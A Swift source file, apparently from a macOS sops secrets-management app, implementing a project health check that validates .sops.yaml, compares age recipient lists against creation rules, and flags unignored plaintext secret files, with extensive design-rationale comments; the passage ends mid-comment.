import Darwin
import Foundation
import SopsEngine

public struct InspectedProject: Equatable, Sendable {
    public let name: String
    public let rootPath: String

    public init(name: String, rootPath: String) {
        self.name = name
        self.rootPath = rootPath
    }
}

public protocol ProjectSourceProviding: Sendable {
    var projects: [InspectedProject] { get }
}

/// PROPOSAL.md §6 D.
///
/// Honesty constraint: this app holds only public keys. It can confirm that a
/// public key *appears in a file's recipient list* — that is a fact it can
/// read straight from the file. It cannot confirm that the holder of that key
/// can actually decrypt the file, because that would need their private key,
/// which this app never has. Every user-facing string this check produces
/// must preserve that distinction: "is encrypted to" / "is not in the key
/// list", never "can decrypt" / "cannot decrypt".
///
/// Never-log constraint: the plaintext-leak finding below reports that a file
/// such as `.env` exists and is not gitignored. It names the file so the user
/// knows what to fix. It must never read or quote the file's contents — not a
/// value, not a fragment, not a preview line — because a finding is exactly
/// the kind of text that gets screenshotted or captured in a log.
///
/// `.sops.yaml` parsing history, for whoever touches this next: this check
/// used to parse `.sops.yaml` with a hand-rolled Swift YAML scanner. Across
/// three review rounds it shipped three different silent-corruption bugs —
/// a nested block list misread as a new rule, a flow list read as one
/// recipient with a stray bracket, and two unrelated rules glued together by
/// a whole-document bracket-balance check that quoted-value brackets in
/// different rules could cancel out against. The pattern was the parser, not
/// any individual bug in it. `.sops.yaml` parsing is now delegated entirely
/// to `SopsBridge.lookupCreationRule`, which crosses into
/// `github.com/getsops/sops/v3/config` — sops's own config parser, the exact
/// code every other sops command uses to answer the same question. This
/// app's understanding of a `.sops.yaml` can no longer drift from what sops
/// itself does with it. See `EncryptedFileMetadata` below for the one piece
/// of text-scanning that remains Swift-side, and its own doc comment for why
/// that one is a materially different, narrower problem.
public struct ProjectHealthCheck: HealthCheck {
    public let id = "project-health"
    public let category = HealthCategory.projects

    private let source: any ProjectSourceProviding
    /// Used for one thing: finding `git`, which answers the gitignore
    /// question. Injected rather than hardcoded to `/usr/bin/git` for the same
    /// reason `ExternalToolCheck` uses it — a GUI app launched from Finder has
    /// no useful process `PATH`.
    private let locator: any ToolLocating
    /// How many files `ProjectScanner.scan` should visit per project before
    /// stopping. Ticket #25 claim 1: `maxScannedFiles` used to be a hardcoded
    /// constant with nothing anywhere that could change it, so a monorepo
    /// past it got a permanently `.unknown` report. A closure, not a
    /// captured `Int`, for the same reason `HealthReport.standard`'s
    /// `updateChecksEnabled` is one: the report is built once and re-run
    /// many times, and a value captured at construction would freeze
    /// whatever Settings › Scanning held then and ignore a change made
    /// mid-session.
    private let scanBudget: @Sendable () -> Int
    /// Where a project's outstanding rotation debt is read from and recorded
    /// to — see `RotationDebtSource`'s doc comment for why this is a
    /// protocol rather than a direct call to `SopsProjects
    /// .RotationDebtLedger`, which is what every real app build wires in
    /// here. Defaults to `NoRotationDebt()`, matching `locator`'s and
    /// `ProjectSourceProviding`'s own "every existing test keeps working
    /// unless it opts in" shape.
    private let rotationDebt: any RotationDebtSource

    public init(
        source: any ProjectSourceProviding, locator: any ToolLocating = ToolLocator(),
        scanBudget: @escaping @Sendable () -> Int = { ScanBudgetSetting.current() },
        rotationDebt: any RotationDebtSource = NoRotationDebt()
    ) {
        self.source = source
        self.locator = locator
        self.scanBudget = scanBudget
        self.rotationDebt = rotationDebt
    }

    public func run() async -> [HealthFinding] {
        let projects = source.projects
        guard !projects.isEmpty else {
            return [HealthFinding(
                id: "project.none", title: "Projects",
                status: .skipped(reason: "No projects have been added yet."),
                detail: "Add a project to have its .sops.yaml and encrypted files checked.")]
        }

        // Located once for the whole run, not once per project.
        let gitPath = await locator.locate("git", versionArguments: ["--version"])?.path

        // Finding ids are scoped by the project's *position*, never by its
        // display name.
        //
        // The previous scheme built ids from the name and disambiguated
        // duplicates by appending "-2", "-3" — which manufactures exactly the
        // collision it was written to prevent: `[acme, acme, acme-2]` yields
        // `project.acme-2.…` twice, once for the disambiguated second "acme"
        // and once for the project actually named "acme-2". `HealthFinding` is
        // `Identifiable` and every surface renders findings in a `ForEach`, so
        // that makes row identity undefined. Names containing dots break it
        // further, the id's own separator being part of the value.
        //
        // An index cannot collide with another index. Deriving identity from
        // anything the user types is the bug; the fix is to stop. The user's
        // own name is unaffected — it is shown in `title`, verbatim.
        //
        // Sequential across projects, not a `TaskGroup` fan-out: each
        // project's own scan already parallelises its tail reads
        // (`ProjectScanner.tailReadConcurrencyWidth`), and running multiple
        // projects' scans concurrently on top of that would multiply file
        // descriptor pressure rather than wall clock — out of scope for what
        // this task measured. A `for` loop replaces the previous `flatMap`
        // only because `findings(for:)` must now `await` the scan; ordering
        // and result shape are otherwise unchanged.
        var allFindings: [HealthFinding] = []
        for (index, project) in projects.enumerated() {
            let scoped = await findings(for: project, idScope: String(index), gitPath: gitPath)
            allFindings.append(contentsOf: scoped.map(\.finding))
        }
        return allFindings
    }

    /// Returns `ScopedFinding`, not `HealthFinding`, and that is the whole
    /// point: a `ScopedFinding` can only be obtained from a
    /// `ProjectScopeAccountant`, which appends the scope disclosure and applies
    /// the status floor. A future branch added here cannot forget to account
    /// for what the walk missed, because a branch that forgets does not
    /// compile. See `ScopedFinding` for what this replaced and why the previous
    /// shape — a local `withScope(_:)` helper called by convention at each
    /// `return` — rotted.
    private func findings(for project: InspectedProject, idScope: String,
                          gitPath: String?) async -> [ScopedFinding] {
        let root = URL(fileURLWithPath: project.rootPath)
        let configURL = root.appendingPathComponent(".sops.yaml")

        // One walk of the tree feeds both findings below.
        let tree = await ProjectScanner.scan(root: root, maxScannedFiles: scanBudget())
        let scope = ProjectScopeAccountant(tree: tree, rootPath: project.rootPath)

        // The directory this project points to is gone — deleted, unmounted,
        // renamed. Nothing below this point ran against anything: the walk
        // never visited a single file, and `configURL`'s own existence check
        // would report "No .sops.yaml" as if it had actually looked, which is
        // exactly the same false confidence as the gitignore finding's
        // "found none" over a scan that never happened. One honest finding
        // replaces all three project findings — sops-yaml, recipients,
        // gitignore — rather than three separately-worded ways of not
        // admitting the same thing. `ProjectSidebar` already surfaces this
        // exact fact today (`ProjectStore.isMissing`, badge in the sidebar);
        // this is the same signal reaching the health report, computed the
        // same way sops-yaml's own existence check below is: reading the
        // filesystem this check already walks, without adding a field to
        // `InspectedProject` that every other call site would then have to
        // keep in sync with the filesystem too.
        guard !tree.rootMissing else {
            return [scope.finding(
                about: .oneKnownPath(project.rootPath),
                id: "project.\(idScope).missing", title: "\(project.name): project directory",
                status: .warning,
                detail: "The directory this project points to, \(project.rootPath), could not be found. Nothing here was checked — not .sops.yaml, not encrypted files, not gitignore status — because there was nothing to look at.",
                remediation: Remediation(
                    explanation: "If the directory was moved or renamed, remove this project and re-add it at the new location. If it was deleted or is on an unmounted volume, removing it here only stops tracking it — nothing on disk is touched either way."))]
        }

        // The directory is there and this process cannot read it. Everything
        // below would answer from the same blindness the walk just hit — and
        // did, before this guard existed: `FileManager.fileExists` on
        // `<root>/.sops.yaml` returns `false` for want of search permission on
        // the root, so the check accused the user of having no `.sops.yaml`
        // while the file sat right there. One honest finding, exactly as for a
        // root that is gone.
        guard !tree.rootUnreadable else {
            let command = ShellQuoting.singleQuoted(project.rootPath).map { "ls -ld " + $0 }
            return [scope.finding(
                about: .oneKnownPath(project.rootPath),
                id: "project.\(idScope).unreadable", title: "\(project.name): project directory",
                status: .warning,
                detail: "The directory this project points to, \(project.rootPath), could not be read. Nothing here was checked — not .sops.yaml, not encrypted files, not gitignore status — because this app could not list what is in it.",
                remediation: Remediation(
                    explanation: "This is a permissions problem, not a problem with the project: something in the path is not readable by the account running this app, or the volume it lives on is mounted without access. Check the ownership and mode of the directory and of every directory above it. This app does not change permissions itself.",
                    command: command))]
        }

        let leak = gitignoreFinding(for: project, idScope: idScope, root: root,
                                    tree: tree, scope: scope, gitPath: gitPath)
        // Emitted regardless of .sops.yaml, for the identical reason `leak`
        // is: a loose file mode is a fact about a file, not about whether
        // this app can parse the config governing it.
        let permissions = filePermissionsFinding(for: project, idScope: idScope, root: root,
                                                  tree: tree, scope: scope)
        // Computed after `leak`, not before: `gitignoreFinding` is what may
        // just have recorded a fresh `.plaintextCommitted` entry for this
        // very run (a tracked, unignored secret file found for the first
        // time), and this finding has to read the ledger *after* that write
        // to show it in the same run rather than only from the next one.
        let debt = rotationDebtFinding(for: project, idScope: idScope, root: root, scope: scope)
        // Independent of .sops.yaml entirely — it reads only each
        // encrypted file's own bytes — so it runs in every branch below,
        // the same way `leak`, `permissions` and `debt` do.
        let encryption = unencryptedLeavesFinding(
            for: project, idScope: idScope, root: root, tree: tree, scope: scope)

        guard FileManager.default.fileExists(atPath: configURL.path) else {
            // The plaintext-leak finding is emitted even here. A project with
            // no .sops.yaml is the *most* likely one to have secrets sitting
            // in plaintext, so suppressing that finding until a config exists
            // would hide it exactly when it matters most.
            return [scope.finding(
                about: .oneKnownPath(configURL.path),
                id: "project.\(idScope).sops-yaml", title: "\(project.name): .sops.yaml",
                status: .warning,
                detail: "No .sops.yaml in \(project.rootPath). Without it, sops has no rules for which keys to encrypt new files to.",
                remediation: Remediation(
                    // Three states this text has been through, in order —
                    // not this text wobbling, but it being kept honest about
                    // what the app could actually do at each point:
                    //
                    // 1. "Create one from the .sops.yaml wizard in this
                    //    app." — a real defect, caught only once this check
                    //    first ran against a real project (an earlier
                    //    task): no such wizard existed anywhere in this app.
                    //    PROPOSAL.md §5 listed one as a future Help feature;
                    //    nothing built yet made the claim true. Telling the
                    //    user to go use a tool that isn't there is exactly
                    //    the "claims more than it established" failure this
                    //    app's findings are held to.
                    // 2. "This app does not have a .sops.yaml generator
                    //    yet — see sops's own documentation for the file
                    //    format." — the honest fallback while (1) was
                    //    false: no in-app claim, just the hand-written path.
                    // 3. Now: SopsConfigGenerator and its wiring into
                    //    RecipientPicker inside the New Secret File wizard
                    //    made the original claim in (1) true, so it comes
                    //    back — pointed at what actually exists, not at the
                    //    future Help feature (1) was still imagining. The
                    //    hand-written path stays alongside it: a user who
                    //    prefers to write the file themselves is not doing
                    //    anything wrong, and this is the only place that
                    //    tells them the shape.
                    //
                    // If a fourth state is ever needed, that is worth
                    // pausing over — not because a fourth revision is
                    // forbidden, but because each of the first three came
                    // from finding a claim this app could not actually back
                    // up yet, and the next one is worth holding to the same
                    // standard before it lands.
                    explanation: "Add a .sops.yaml file at the project root with a creation_rules entry naming the age public keys new files should be encrypted to. This app can propose one now: select this project, click the toolbar's New File button (or press ⌘N), add at least one recipient, then click Propose .sops.yaml — it shows the file before writing it, and writes it only once you confirm. Writing the file by hand is just as valid; see sops's own documentation for the file format.")), leak, permissions, debt, encryption]
        }

        // Probe that the config itself loads under sops's own parser,
        // independent of any specific file. The target path is never used
        // for anything but path_regex matching (sops does no I/O on it), so
        // a synthetic, non-existent name is fine here — only the "did the
        // config load" outcome from this call is used.
        //
        // Deliberately *not* routed through `recipientFinding`'s
        // `ruleMatchingPath`, and it needs no equivalent: both paths in this
        // pair are built from the same `root` string, so the directory sops
        // strips is spelled identically to the target's prefix and the strip
        // is already exact. The mismatch that helper exists for arrives only
        // with a path from `FileManager.enumerator`, and no enumerated path
        // reaches here. What the strip yields would not change this outcome
        // anyway: whether a rule matched is discarded here, and the two things
        // this branch reports — YAML that will not parse, and a `path_regex`
        // that will not compile — are both decided before any regex is matched
        // against the stripped string.
        let probeTarget = root.appendingPathComponent(".sops-health-check-probe").path
        do {
            _ = try SopsBridge.lookupCreationRule(configPath: configURL.path, targetFilePath: probeTarget)
        } catch {
            return [scope.finding(
                about: .oneKnownPath(configURL.path),
                id: "project.\(idScope).sops-yaml", title: "\(project.name): .sops.yaml",
                status: .problem,
                detail: "The .sops.yaml in \(project.rootPath) could not be parsed: \(error).",
                remediation: Remediation(
                    explanation: "Fix the YAML syntax, then re-run this check.")), leak, permissions, debt, encryption]
        }

        return [
            scope.finding(about: .oneKnownPath(configURL.path),
                          id: "project.\(idScope).sops-yaml",
                          title: "\(project.name): .sops.yaml", status: .ok,
                          detail: "The .sops.yaml in \(project.rootPath) parses successfully."),
            recipientFinding(for: project, idScope: idScope, root: root,
                             configPath: configURL.path, tree: tree, scope: scope),
            leak,
            permissions,
            debt,
            encryption,
        ]
    }

    // MARK: - Scope disclosure, as this suite's tests still name it

    /// The scope disclosure itself now lives in `ProjectScopeDisclosure.swift`,
    /// behind `ProjectScopeAccountant`, because a helper this type could choose
    /// *not* to call was the thing that failed twice. These three forwarders
    /// exist so the disclosure suite keeps naming the behaviour where a reader
    /// looks for it — on the check that produces the findings — while the only
    /// implementation lives with the type that cannot be bypassed.

    /// See `ProjectScopeAccountant.namesShown`.
    static var excludedNamesShown: Int { ProjectScopeAccountant.namesShown }

    /// See `ProjectScopeAccountant.leadIn`.
    static var scopeLeadIn: String { ProjectScopeAccountant.leadIn }

    /// See `ProjectScopeAccountant.scopeSentence(tree:relativeTo:)`.
    ///
    /// `relativeTo` defaults to `nil`, which prints absolute paths — fine for
    /// a unit test asserting on wording, never how a real finding is built
    /// (`ProjectScopeAccountant` always has the project root).
    static func scanScopeSentence(tree: ScannedTree, relativeTo rootPath: String? = nil) -> String? {
        ProjectScopeAccountant.scopeSentence(tree: tree, relativeTo: rootPath)
    }

    /// Human-readable label for a sops master-key type identifier
    /// (`keys.MasterKey.TypeToIdentifier()`, e.g. from
    /// `CreationRuleLookup.nonAgeBackends` or
    /// `EncryptedFileMetadata.nonAgeBackends(inEncryptedFile:)`).
    private static func backendLabel(_ key: String) -> String {
        switch key {
        case "pgp": return "PGP"
        case "kms": return "AWS KMS"
        case "gcp_kms": return "GCP KMS"
        case "hckms": return "HC Vault KMS"
        case "azure_kv": return "Azure Key Vault"
        case "hc_vault": return "HashiCorp Vault"
        case "key_groups": return "key groups"
        default: return key
        }
    }

    /// Backend identifiers as a sentence fragment: "PGP", "AWS KMS and
    /// HashiCorp Vault", "AWS KMS, PGP and HashiCorp Vault". Sorted by the
    /// label a reader sees, not by the identifier behind it — sorting by
    /// identifier puts "HashiCorp Vault" (hc_vault) before "AWS KMS" (kms),
    /// which reads like a mistake.
    private static func backendList(_ keys: some Collection<String>) -> String {
        let labels = keys.map(backendLabel).sorted()
        guard let last = labels.last else { return "" }
        guard labels.count > 1 else { return last }
        return labels.dropLast().joined(separator: ", ") + " and " + last
    }

    /// One spelling for a path, so a file found by directory enumeration can
    /// be reported relative to the project root the user gave us.
    ///
    /// Two things get in the way. Symlinked roots: a root under `/var` (a
    /// symlink to `/private/var`) enumerates its contents as `/private/var/…`,
    /// so stripping the root's own spelling as a prefix fails and the whole
    /// absolute path lands in the finding. And Foundation's own asymmetry:
    /// `resolvingSymlinksInPath()` *removes* a leading `/private`, it does not
    /// add one, so it alone does not reconcile the two. Normalizing both sides
    /// the same way — resolve, then drop a leading `/private` — does.
    private static func canonicalPath(_ path: String) -> String { CanonicalPath.of(path) }

    /// Compares each encrypted file's actual key list against the rule that
    /// governs it. This is a comparison of two lists of public keys read from
    /// disk — see the type-level doc comment for what it does and does not
    /// prove about decryption.
    ///
    /// Age is not the only backend sops supports, and this app only ever holds
    /// age keys. Three independent signals say "part of this project is
    /// something this app cannot evaluate", and all three must reach the user
    /// rather than falling through to `.ok`:
    ///
    /// 1. **The config as a whole** (`SopsBridge.inspectConfigBackends`) —
    ///    which backends `.sops.yaml` names anywhere, files or no files. This
    ///    is the only signal that can see a rule declaring pgp/KMS/Vault that
    ///    *no file currently matches*. Without it, such a rule was invisible:
    ///    the per-file lookup below never resolves it, nothing lands in the
    ///    unverifiable bucket, and the finding folded that silence into a
    ///    confident "every file's key list matches" — an OK about a
    ///    configuration this app cannot read at all, which PROPOSAL.md §6 D
    ///    forbids in as many words.
    /// 2. **The rule governing a specific file** (`CreationRuleLookup`).
    /// 3. **The file's own metadata** (`EncryptedFileMetadata`) — ground truth
    ///    for what actually protects it right now, which can drift from what
    ///    its rule declares.
    /// 4. **The scan itself** (`ScannedTree.wasTruncated`) — whether the walk
    ///    that produced `tree` covered the whole project or gave up at
    ///    `maxScannedFiles`. This is a different kind of gap from the other
    ///    three: it is not that some backend or file is unreadable, it is
    ///    that files may exist which were never looked at at all. Reporting
    ///    `.ok` over an incomplete walk is the same vacuous verdict every
    ///    other signal here exists to prevent, so it goes into the same
    ///    `unverifiable` bucket and blocks `.ok` the same way.
    ///
    /// Status precedence, deliberate: a genuine age-recipient mismatch is
    /// still `.problem` even when something else was unreadable — a real,
    /// actionable finding must never be buried under a caveat. Otherwise any
    /// unreadable signal makes the finding `.unknown`, never `.ok`, and the
    /// detail leads with what *was* verified so a user with one healthy age
    /// rule still learns that part is fine.
    ///
    /// `.unknown` rather than `.skipped`, though PROPOSAL.md §6 D says
    /// "Skipped": in this codebase `.skipped` means the check's subject does
    /// not exist yet (`HealthStatus`'s own doc comment; it is what "no
    /// projects have been added" reports), and `.unknown` means the check ran
    /// but could not reach a verdict. This check did run — it read the config
    /// and every encrypted file, and reached a verdict on the age part. The
    /// proposal's substantive requirement is "must never report OK about a
    /// configuration it cannot read", and `.unknown` satisfies it while
    /// ranking above `.skipped` in `HealthStatus.severity`, so a caveat
    /// cannot be hidden behind an informational status. It also keeps one
    /// vocabulary for all three signals above, which already used `.unknown`.
    private func recipientFinding(for project: InspectedProject, idScope: String, root: URL,
                                  configPath: String, tree: ScannedTree,
                                  scope: ProjectScopeAccountant) -> ScopedFinding {
        var mismatches: [String] = []
        var sawStaleRecipient = false
        var unverifiable: [String] = []
        var unreadableBackends: Set<String> = []
        var verifiedFileCount = 0

        // Signal 1: the whole config, independent of which files exist.
        do {
            let declared = try SopsBridge.inspectConfigBackends(configPath: configPath).backends
            if !declared.isEmpty {
                unreadableBackends.formUnion(declared)
                unverifiable.append("This project's .sops.yaml declares \(Self.backendList(declared)) somewhere in its creation rules. This app reads age recipients only, so it did not check any rule that uses those keys — including a rule no file matches yet, which nothing else here would mention. That is a limit of this app, not a problem with those keys.")
            }
        } catch {
            unverifiable.append("This project's .sops.yaml could not be read for the list of key backends it declares (\(error)), so this app cannot tell whether every rule in it is one it is able to check.")
        }

        let rootPrefix = Self.canonicalPath(root.path) + "/"
        func relativeName(_ url: URL) -> String {
            // `ofLeaf`, not `of`: a `.env` reachable through a symbolic link
            // must be named by the link inside the project, not by the target
            // outside it. See `CanonicalPath.ofLeaf`.
            let path = CanonicalPath.ofLeaf(url.path)
            return path.hasPrefix(rootPrefix) ? String(path.dropFirst(rootPrefix.count)) : path
        }

        /// The form of a file's path `SopsBridge.lookupCreationRule` has to be
        /// given, which is *not* the form the walk hands back.
        ///
        /// sops picks the rule governing a file by stripping the config's own
        /// directory off the file's path **as a literal prefix** and matching
        /// `path_regex` against what is left (`config/config.go`'s
        /// `parseCreationRuleForFile`: `strings.TrimPrefix(filePath, configDir
        /// + "/")`, over a `configDir` that is `filepath.Abs`'d and so never
        /// symlink-resolved). That only works when both paths are spelled the
        /// same way — and they are not. `FileManager.enumerator` yields entries
        /// with the symlinks in their directory prefix already resolved (a root
        /// under `/var` enumerates as `/private/var/…`), while `configPath` is
        /// built from `project.rootPath`, which keeps whatever spelling the
        /// project was added under because `ProjectStore` deliberately stores
        /// the display path. With the two disagreeing the strip is a no-op and
        /// every `path_regex` is matched against an *absolute* path: an
        /// anchored rule like `^secrets/` then matches nothing at all, and an
        /// unanchored one like `.*\.yaml$` matches everything — which is why
        /// this survived, the fixtures all being the second kind.
        ///
        /// The fix re-spells the file onto the root the caller gave us rather
        /// than resolving both sides, as `ProjectRecipientApplier`'s
        /// `ruleMatchingPath` does. Three reasons, all of which apply here and
        /// not there:
        ///
        /// * It introduces no second normalisation rule. The relative name is
        ///   the one `relativeName` already computed through `CanonicalPath`,
        ///   this module's single canonicaliser, so the string sops matches
        ///   against and the string the finding prints cannot drift apart.
        /// * `configPath` reaches the bridge exactly as the user spelled it,
        ///   and the bridge *opens* that file. `CanonicalPath.of` drops a
        ///   leading `/private`, which is right for comparing paths (it is what
        ///   reconciles `/var` with `/private/var`) and wrong for one that has
        ///   to open: it only names an existing file while `/private/<x>`
        ///   happens to be symlinked from `/<x>`, as `var`, `tmp` and `etc`
        ///   are and an arbitrary directory is not.
        /// * A symlink to a regular file inside the project is a file this walk
        ///   reports (see `ProjectScanner`), and the rule governing it is the
        ///   one matching the link's own path inside the project — what sops
        ///   would match if the user ran it on that path. Resolving the leaf
        ///   would ask about the target instead, which for a link pointing out
        ///   of the project matches no rule at all. `CanonicalPath.ofLeaf`
        ///   resolves the directory and keeps the leaf, which is exactly the
        ///   distinction this needs and the one `relativeName` is already made
        ///   of.
        ///
        /// Used only to *ask about* a file. Nothing user-facing is spelled from
        /// it, and nothing is ever written to it.
        func ruleMatchingPath(_ url: URL) -> String {
            let relative = relativeName(url)
            // `relativeName` falls back to an absolute path for anything not
            // under the root — which the walk should never produce, but
            // re-rooting one would build nonsense rather than fail.
            guard !relative.hasPrefix("/") else { return relative }
            return root.appendingPathComponent(relative).path
        }

        // Encrypted files this build cannot read at all. The bridge is
        // YAML-only in M1 (`gobridge.Format`), so a sops-encrypted .env, .json
        // or .ini carries metadata in a shape `EncryptedFileMetadata` does not
        // parse. Saying so is the point: silently omitting them from the count
        // and then reporting OK is the same vacuous verdict this whole
        // finding was rewritten to stop producing.
        for url in tree.encryptedInOtherFormats {
            unverifiable.append("\(relativeName(url)) is sops-encrypted in a format this app does not read yet — this build handles YAML only — so its recipient list was not checked.")
        }

        for sniffed in tree.encrypted {
            let relative = relativeName(sniffed.url)

            let lookup: CreationRuleLookup
            do {
                // `ruleMatchingPath`, never `sniffed.url.path` — see that
                // helper for what the raw walk spelling does to an anchored
                // `path_regex`.
                lookup = try SopsBridge.lookupCreationRule(
                    configPath: configPath, targetFilePath: ruleMatchingPath(sniffed.url))
            } catch {
                unverifiable.append("\(relative): could not determine which rule governs it (\(error)).")
                continue
            }
            // No rule governs this file. Previously a bare `continue`, which
            // dropped the file from the report entirely and let the `.ok`
            // branch below announce that every encrypted file had been
            // checked. An encrypted file with no creation rule is precisely
            // the case where this app has nothing to compare against and must
            // say so.
            guard lookup.matched else {
                unverifiable.append("\(relative) is encrypted, but no creation rule in .sops.yaml governs it, so there is no declared key list to compare its recipients against.")
                continue
            }

            // Ground truth from the file itself: what actually protects it
            // right now, regardless of what the rule declares. The two can
            // disagree — a file encrypted before its rule changed — so both
            // are reported, except when they say exactly the same thing,
            // where two sentences saying it would just be noise.
            let ruleBackends = Set(lookup.nonAgeBackends)
            let fileBackends = Set(EncryptedFileMetadata.nonAgeBackends(inEncryptedFile: sniffed.tail))
            unreadableBackends.formUnion(ruleBackends)
            unreadableBackends.formUnion(fileBackends)

            if !ruleBackends.isEmpty, ruleBackends == fileBackends {
                unverifiable.append("\(relative) is protected by \(Self.backendList(ruleBackends)), which the rule governing it also declares. This app reads age recipients only, so its key list was not checked.")
            } else {
                if !ruleBackends.isEmpty {
                    unverifiable.append("The rule governing \(relative) also allows \(Self.backendList(ruleBackends)), which this app cannot read — it only understands age recipients.")
                }
                if !fileBackends.isEmpty {
                    unverifiable.append("\(relative) is protected, at least in part, by \(Self.backendList(fileBackends)), which this app cannot read — it only understands age recipients.")
                }
            }

            let actual = Set(EncryptedFileMetadata.recipients(inEncryptedFile: sniffed.tail))
            let expected = Set(lookup.ageRecipients)

            // Only a comparison with at least one age key on one side is a
            // real comparison. Two empty sets matching is exactly the vacuous
            // "check" that produced the original false OK, so it must never
            // be counted as a file this app verified.
            if !(actual.isEmpty && expected.isEmpty) { verifiedFileCount += 1 }

            for extra in actual.subtracting(expected).sorted() {
                mismatches.append("\(relative) is encrypted to \(extra), which is not in the key list .sops.yaml declares for it.")
                sawStaleRecipient = true
            }
            for missing in expected.subtracting(actual).sorted() {
                mismatches.append("\(relative) does not list \(missing) among its recipients, but .sops.yaml declares it for this file.")
            }
        }

        if !mismatches.isEmpty {
            // A key that was removed from .sops.yaml but still appears in a
            // file's recipient list already saw the plaintext once; removing
            // the entry from the config does not retract that. The
            // remediation says so explicitly, using "rotate" rather than
            // implying re-encryption alone fixes it.
            let rotateNote = sawStaleRecipient
                ? " If a recipient was removed on purpose, also rotate the secret values themselves — that key's holder already had a chance to see the old plaintext, and re-wrapping the file does not undo that."
                : ""
            var detail = mismatches.joined(separator: "\n")
            if !unverifiable.isEmpty {
                detail += "\n\nThis app also could not fully check:\n" + unverifiable.joined(separator: "\n")
            }
            return scope.finding(
                about: .theWholeTree,
                id: "project.\(idScope).stale-recipients",
                title: "\(project.name): recipients", status: .problem,
                detail: detail,
                remediation: Remediation(
                    // Ticket #22, claim 4: this used to send the user to the
                    // CLI with nowhere to go if they didn't have `sops`
                    // installed. This app's own Project Access panel
                    // (`ProjectAccessModel`) does the identical rewrap —
                    // read the recipients, re-wrap the data key for exactly
                    // the set `.sops.yaml` declares — entirely in memory,
                    // without shelling out to the CLI at all.
                    explanation: "Run updatekeys to re-wrap these files for the recipients .sops.yaml declares."
                        + " This app's own \"Project Access…\" panel for this project does the same thing,"
                        + " entirely in memory, without running the CLI." + rotateNote,
                    command: "sops updatekeys <file>"))
        }

        // `tree.wasTruncated` is a status condition in its own right, not just
        // a line of prose: a walk that gave up part-way through cannot produce
        // an affirmative verdict about recipients, exactly as PROPOSAL.md §6 D
        // requires of the budget route ("the finding degrading to *Unknown*").
        // The exclusion deliberately does **not** appear here — see
        // `scanScopeSentence` and the disclosure suite for why a permanent,
        // named, bounded exclusion is stated rather than allowed to make every
        // finding in the app permanently `.unknown`.
        guard unverifiable.isEmpty, !tree.wasTruncated else {
            // Lead with what was actually verified. A user whose age rule is
            // healthy deserves to know that part is fine; they must simply
            // not read it as a verdict on the whole project.
            let verified: String
            switch verifiedFileCount {
            case 0:
                verified = "No encrypted file's age recipient list could be checked here, so this app is not vouching for this project's recipients either way."
            case 1:
                verified = "Checked 1 encrypted file's age recipient list against the rule that governs it — it matches."
            default:
                verified = "Checked \(verifiedFileCount) encrypted files' age recipient lists against the rules that govern them — they all match."
            }
            // Truncation is named first when it applies. It is the broadest
            // gap of the three — an unreadable backend is a bounded fact about
            // a named rule or file, whereas a walk that ran out of budget
            // cannot even say *which* files it missed — so it is the reason a
            // one-line status should carry.
            let reason: String
            if tree.wasTruncated {
                reason = "This project has more files than this app's scan budget, so part of the tree was never checked."
            } else if !unreadableBackends.isEmpty {
                reason = "This project uses \(Self.backendList(unreadableBackends)), which this app cannot read — it only understands age keys."
            } else {
                reason = "Part of this project's recipients could not be checked. This is not a verdict on them."
            }
            var detail = verified
            if !unverifiable.isEmpty {
                detail += "\n\nDeliberately not checked:\n"
                    + unverifiable.map { "• " + $0 }.joined(separator: "\n")
            }
            return scope.finding(
                about: .theWholeTree,
                id: "project.\(idScope).stale-recipients",
                title: "\(project.name): recipients",
                status: .unknown(reason: reason),
                detail: detail,
                remediation: Remediation(
                    explanation: "Nothing here needs fixing on this app's account — it reports only what it read. To check the rest, use the tooling for that backend: `gpg --list-keys` for PGP, or your cloud provider's console for KMS, Key Vault or Vault. This app only manages age keys."))
        }

        // Nothing was unreadable, and nothing disagreed. That is only an
        // affirmative OK if something was actually compared.
        //
        // `verifiedFileCount` has always been the right number — it is
        // incremented only when at least one age key sits on one side of the
        // comparison, precisely so that "two empty sets are equal" is not
        // mistaken for a verified file. It just was never read here. The old
        // sentence, "Checked every encrypted file's recipient key list against
        // the rule that governs it — every file's key list matches", was
        // printed verbatim over zero files in three separate reproduced
        // situations: a project with no encrypted files at all, a project
        // whose only encrypted files were hidden, and a project whose
        // encrypted file matched no creation rule.
        guard verifiedFileCount > 0 else {
            // The subject does not exist yet: no encrypted file was found
            // anywhere under the project root. `.skipped` per
            // `HealthStatus`'s own vocabulary, and it names the fact rather
            // than implying a verdict.
            guard !tree.encrypted.isEmpty || !tree.encryptedInOtherFormats.isEmpty else {
                return scope.finding(
                about: .theWholeTree,
                    id: "project.\(idScope).stale-recipients",
                    title: "\(project.name): recipients",
                    // "under", not "anywhere under": the walk behind this has
                    // an exclusion list, so "anywhere" was a claim it could
                    // not make. The scope paragraph in the detail says which
                    // places, and this reason no longer overstates what the
                    // one-liner covers.
                    status: .skipped(reason: "No sops-encrypted files were found under \(project.rootPath)."),
                    detail: "The .sops.yaml here parses and uses age keys only, but there are no encrypted files yet, so no recipient list was compared against it. This app is not vouching for this project's recipients either way.")
            }
            // Files exist, every one of them resolved to a rule, and not one
            // comparison had an age key on either side. The check ran and
            // reached no verdict.
            return scope.finding(
                about: .theWholeTree,
                id: "project.\(idScope).stale-recipients",
                title: "\(project.name): recipients",
                status: .unknown(reason: "No encrypted file here declares an age recipient, and neither does the rule governing it, so there was nothing to compare."),
                detail: "Encrypted files were found under \(project.rootPath), but none of them — and none of the rules governing them — names a single age recipient. This app reads age recipients, so it has not verified anything about how these files are protected.")
        }

        let checked = verifiedFileCount == 1
            ? "Checked 1 encrypted file's recipient key list against the rule that governs it — it matches."
            : "Checked \(verifiedFileCount) encrypted files' recipient key lists against the rules that govern them — they all match."
        return scope.finding(
                about: .theWholeTree,
            id: "project.\(idScope).stale-recipients",
            title: "\(project.name): recipients", status: .ok,
            detail: checked + " Every rule in .sops.yaml uses age keys only, so there is nothing here this app could not read.")
    }

    /// Reports only that a plaintext secret file exists and is not
    /// gitignored — never its contents. See the type-level doc comment.
    ///
    /// Two things changed here after the whole-branch review, both because the
    /// old version was verified wrong against `git check-ignore`:
    ///
    /// 1. **Scope.** PROPOSAL.md §6 D says "inside the repo"; the old scan
    ///    looked only at the project root, so `services/api/.env` holding a
    ///    live `sk_live_…` was invisible and the finding said "No unignored
    ///    plaintext secret files found." The scan is now the whole tree.
    /// 2. **The oracle.** Ignore status is decided by `git check-ignore`, not
    ///    by comparing `.gitignore` lines to filenames. See `GitIgnoreOracle`.
    ///
    /// When git cannot answer — no repository, no git binary — the finding is
    /// `.unknown` and still names the files it found. Guessing is what
